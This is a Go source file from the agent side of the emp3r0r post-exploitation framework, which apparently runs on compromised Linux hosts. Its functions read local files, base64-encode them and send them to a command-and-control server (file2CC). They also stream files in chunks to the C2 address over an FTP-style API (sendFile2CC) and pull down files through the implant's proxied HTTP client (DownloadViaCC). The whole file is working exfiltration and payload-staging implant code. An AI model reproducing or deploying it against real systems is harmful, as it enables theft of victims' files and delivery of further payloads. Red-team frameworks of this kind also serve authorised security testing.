//go:build linux
// +build linux

package agent

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"log"
	"os"
	"time"

	"github.com/cavaliergopher/grab/v3"
	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// send local file to CC, Deprecated
func file2CC(filepath string, offset int64) (checksum string, err error) {
	// open and read the target file
	f, err := os.Open(filepath)
	if err != nil {
		return
	}
	total := util.FileSize(filepath)
	bytes := make([]byte, total-offset)
	_, err = f.ReadAt(bytes, offset)
	if err != nil {
		return
	}
	checksum = tun.SHA256SumRaw(bytes)

	// base64 encode
	payload := base64.StdEncoding.EncodeToString(bytes)

	fileData := emp3r0r_data.MsgTunData{
		Payload: "FILE" + emp3r0r_data.OpSep + filepath + emp3r0r_data.OpSep + payload,
		Tag:     emp3r0r_data.AgentTag,
	}

	// send
	return checksum, Send2CC(&fileData)
}

// DownloadViaCC download via EmpHTTPClient
// if path is empty, return []data instead
func DownloadViaCC(url, path string) (data []byte, err error) {
	log.Printf("DownloadViaCC is downloading from %s to %s", url, path)
	retData := false
	if path == "" {
		retData = true
		log.Printf("No path specified, will return []byte")
	}

	// use EmpHTTPClient
	client := grab.NewClient()
	client.HTTPClient = tun.EmpHTTPClient(emp3r0r_data.AgentProxy)

	req, err := grab.NewRequest(path, url)
	if err != nil {
		err = fmt.Errorf("Create grab request: %v", err)
		return
	}
	resp := client.Do(req)
	if retData {
		return resp.Bytes()
	}

	// progress
	t := time.NewTicker(time.Second)
	defer func() {
		t.Stop()
		if !retData && !util.IsFileExist(path) {
			data = nil
			err = fmt.Errorf("%s not found, download failed", path)
		}
	}()
	for !resp.IsComplete() {
		select {
		case <-resp.Done:
			err = resp.Err()
			if err != nil {
				err = fmt.Errorf("DownloadViaCC finished with error: %v", err)
				log.Print(err)
				return
			}
			log.Printf("DownloadViaCC: saved %s to %s (%d bytes)", url, path, resp.Size())
			return
		case <-t.C:
			log.Printf("%.02f%% complete\n", resp.Progress()*100)
		}
	}

	return
}

// sendFile2CC send file to CC, with buffering
// using FTP API
func sendFile2CC(filepath string, offset int64, token string) (err error) {
	log.Printf("Sending %s to CC, offset=%d", filepath, offset)
	// open and read the target file
	f, err := os.Open(filepath)
	if err != nil {
		err = fmt.Errorf("sendFile2CC: failed to open %s: %v", filepath, err)
		return
	}
	defer f.Close()

	// seek offset
	_, err = f.Seek(offset, 0)
	if err != nil {
		err = fmt.Errorf("sendFile2CC: failed to seek %d in %s: %v", offset, filepath, err)
		return
	}

	// connect
	url := emp3r0r_data.CCAddress + tun.FTPAPI + "/" + token
	conn, ctx, cancel, err := ConnectCC(url)
	log.Printf("sendFile2CC: connection: %s", url)
	if err != nil {
		err = fmt.Errorf("sendFile2CC: connection failed: %v", err)
		return
	}
	defer cancel()
	defer conn.Close()

	// read
	var (
		buf []byte
	)

	// read file and send data
	log.Printf("Reading from %s", filepath)
	scanner := bufio.NewScanner(f)
	scanner.Split(bufio.ScanBytes)
	for ctx.Err() == nil && scanner.Scan() {
		buf = append(buf, scanner.Bytes()...)
		if len(buf) == 1024*8 {
			_, err = conn.Write(buf)
			if err != nil {
				return
			}
			buf = make([]byte, 0)
			continue
		}
	}
	if len(buf) > 0 && len(buf) < 1024*8 {
		_, err = conn.Write(buf)
		if err != nil {
			return
		}
		log.Printf("Sending remaining %d bytes", len(buf))
	}

	return
}
